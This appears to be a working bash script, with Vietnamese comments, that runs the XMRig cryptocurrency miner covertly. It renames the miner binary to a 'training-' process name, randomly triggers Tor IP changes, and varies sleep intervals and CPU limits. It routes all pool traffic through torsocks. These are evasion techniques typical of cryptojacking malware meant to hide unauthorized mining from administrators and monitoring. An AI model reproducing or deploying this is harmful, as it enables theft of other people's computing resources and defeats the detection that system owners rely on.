#!/bin/bash

# Vòng lặp vô tận để thay đổi IP ngẫu nhiên
while true; do
  # Ngẫu nhiên hóa thời gian ngủ từ 5 đến 30 phút
  sleep_time=$(shuf -i 300-1800 -n 1)
  sleep $sleep_time

  # Quyết định có đổi IP hay không với xác suất ngẫu nhiên
  should_change_ip=$(shuf -i 1-100 -n 1)

  # Chỉ đổi IP nếu giá trị ngẫu nhiên < 70 (70% cơ hội đổi IP)
  if [ "$should_change_ip" -lt 70 ]; then
    echo "Đang yêu cầu Tor thay đổi IP..."
    kill -HUP $(pgrep tor)
    echo "Tor đã thay đổi IP."
  else
    echo "Quyết định giữ nguyên IP ở chu kỳ này."
  fi

  # Đọc tên tiến trình từ file xmrig_name.txt nếu tồn tại
  if [ -f /root/xmrig_name.txt ]; then
    RANDOM_NAME=$(cat /root/xmrig_name.txt)
  else
    # Tạo tên tiến trình ngẫu nhiên nếu file không tồn tại
    RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
    echo $RANDOM_NAME > /root/xmrig_name.txt
    mv /root/work/xmrig /root/work/$RANDOM_NAME
  fi

  # Tính toán số threads dựa trên % CPU ngẫu nhiên
  TOTAL_CORES=$(nproc)  # Xác định số CPU logic của hệ thống
  cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)  # Phần trăm CPU sử dụng ngẫu nhiên
  CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)  # Tính số threads

  # Phân bổ tiến trình trên nhiều core với taskset
  CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))  # Sử dụng tất cả các core logic

  # Giới hạn công suất từ 50% đến 90% với cpulimit
  TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))  # Tổng công suất hệ thống
  CPU_LIMIT_PERCENT=$(shuf -i 50-90 -n 1)  # Giới hạn công suất ngẫu nhiên từ 50% đến 90%
  CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))  # Tính giá trị giới hạn CPU thực tế

  # Khởi động lại XMRig với tên tiến trình từ file xmrig_name.txt và giới hạn CPU
  echo "Khởi động lại XMRig với tên tiến trình: $RANDOM_NAME"
  cpulimit -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
done
